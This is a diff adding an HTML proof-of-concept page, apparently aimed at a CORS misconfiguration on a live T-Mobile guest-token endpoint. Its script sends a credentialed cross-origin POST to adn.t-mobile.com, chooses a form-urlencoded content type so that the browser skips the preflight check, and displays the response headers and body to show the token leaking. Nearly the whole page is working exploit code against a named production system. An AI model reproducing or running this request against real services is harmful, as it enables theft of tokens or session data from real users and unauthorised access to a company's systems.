@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>T-Mobile CORS PoC - Fix 500</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; background: #f0f0f0; text-align: center; }
+        .box { max-width: 750px; margin: auto; background: white; padding: 30px; border-radius: 10px; border: 3px solid #e20074; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        h1 { color: #e20074; margin-bottom: 5px; }
+        #runBtn { 
+            background: #e20074; color: white; padding: 20px 40px; 
+            font-size: 1.2rem; border: none; border-radius: 5px; 
+            cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px;
+        }
+        #runBtn:hover { background: #b1005b; }
+        #output { 
+            margin-top: 20px; background: #222; color: #4af626; 
+            padding: 15px; text-align: left; overflow: auto; 
+            min-height: 150px; font-family: monospace; white-space: pre-wrap;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h1>T-Mobile Security Test</h1>
+    <p>Targeting Guest Token Endpoint</p>
+    
+    <button id="runBtn">FIRE EXPLOIT REQUEST</button>
+    
+    <div id="output">Waiting for execution...</div>
+</div>
+
+<script>
+    console.log("POC Script Loaded - Form Encoding Mode");
+
+    var btn = document.getElementById('runBtn');
+    var output = document.getElementById('output');
+
+    btn.onclick = function() {
+        console.log("Button clicked!");
+        output.innerText = "Firing request... Check Network Tab for 200 or 500";
+
+        var cacheBuster = '?v=' + Date.now();
+        var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens' + cacheBuster;
+
+        fetch(target, {
+            method: 'POST',
+            mode: 'cors',
+            credentials: 'include',
+            headers: {
+                // This stays as form-urlencoded to skip the OPTIONS preflight block
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Accept': 'application/json'
+            },
+            // FIX: We send a standard form string, not a JSON string
+            body: 'grant_type=guest_token'
+        })
+        .then(function(response) {
+            console.log("Response status:", response.status);
+            
+            // Capture the ACAO header to prove the leak
+            var acao = response.headers.get('Access-Control-Allow-Origin');
+            var acac = response.headers.get('Access-Control-Allow-Credentials');
+
+            return response.text().then(function(text) {
+                output.innerText = "STATUS: " + response.status + 
+                                   "\nACAO Header: " + (acao || "MISSING") + 
+                                   "\nACAC Header: " + (acac || "MISSING") + 
+                                   "\n\nResponse Body:\n" + text;
+            });
+        })
+        .catch(function(err) {
+            console.error("Fetch failed:", err);
+            output.innerText = "ERROR: " + err;
+        });
+    };
+</script>
+
+</body>
+</html>
